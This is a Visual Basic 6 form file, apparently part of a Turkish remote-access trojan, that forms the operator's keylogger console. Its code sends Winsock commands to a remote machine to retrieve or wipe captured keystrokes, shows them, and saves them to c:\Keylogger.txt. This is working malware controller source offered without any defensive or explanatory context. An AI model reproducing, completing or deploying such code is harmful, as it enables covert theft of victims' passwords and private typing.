VERSION 5.00
Begin VB.Form Form4 
   BackColor       =   &H00000000&
   BorderStyle     =   3  'Fixed Dialog
   Caption         =   "Keylogger"
   ClientHeight    =   5385
   ClientLeft      =   45
   ClientTop       =   375
   ClientWidth     =   9240
   LinkTopic       =   "Form4"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   5385
   ScaleWidth      =   9240
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Begin VB.Timer Timer2 
      Interval        =   150
      Left            =   8400
      Top             =   4920
   End
   Begin VB.TextBox Text2 
      Height          =   3855
      Left            =   9480
      TabIndex        =   4
      Top             =   120
      Width           =   2055
   End
   Begin VB.CommandButton Command3 
      Caption         =   "Sil"
      Height          =   375
      Left            =   2760
      TabIndex        =   3
      Top             =   4920
      Width           =   1215
   End
   Begin VB.CommandButton Command2 
      Caption         =   "Kaydet"
      Height          =   375
      Left            =   1440
      TabIndex        =   2
      Top             =   4920
      Width           =   1215
   End
   Begin VB.CommandButton Command1 
      Caption         =   "Yenile"
      Height          =   375
      Left            =   120
      TabIndex        =   1
      Top             =   4920
      Width           =   1215
   End
   Begin VB.TextBox Text1 
      BackColor       =   &H00000000&
      ForeColor       =   &H0000FF00&
      Height          =   4815
      Left            =   0
      MultiLine       =   -1  'True
      ScrollBars      =   3  'Both
      TabIndex        =   0
      Top             =   0
      Width           =   9255
   End
End
Attribute VB_Name = "Form4"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub Command1_Click()
Form1.Winsock1.SendData "keylog_gonder"
Text1.Text = Text2.Text
End Sub

Private Sub Command2_Click()
On Error Resume Next
Dim yer As String

yer = "c:\Keylogger.txt"
Open yer For Output As #1
Print #1, Text1.Text;
Close #1

MsgBox "Keylogger Bilgileri" & vbCrLf & "c:\Keylogger.txt" & vbCrLf & "Belgesine Kaydedilmiþtir.", vbInformation, "Keylogger"
End Sub

Private Sub Command3_Click()
On Error Resume Next
Form1.Winsock1.SendData "keylog_sil"
Text1.Text = Text2.Text
End Sub

Private Sub Form_Load()
On Error Resume Next
Form1.Winsock1.SendData "keylog_gonder"
Text1.Text = Text2.Text
End Sub

Private Sub Form_Unload(Cancel As Integer)
On Error Resume Next
Form1.Winsock1.SendData "islem|" + "KEYLOGGER KAPATILDI"
End Sub

Private Sub Text1_Change()
Text1.Text = Text2.Text
End Sub

Private Sub Text2_Change()
Text1.Text = Text2.Text
End Sub

Private Sub Timer2_Timer()
Text1.Text = Text2.Text
Timer2.Enabled = False
End Sub
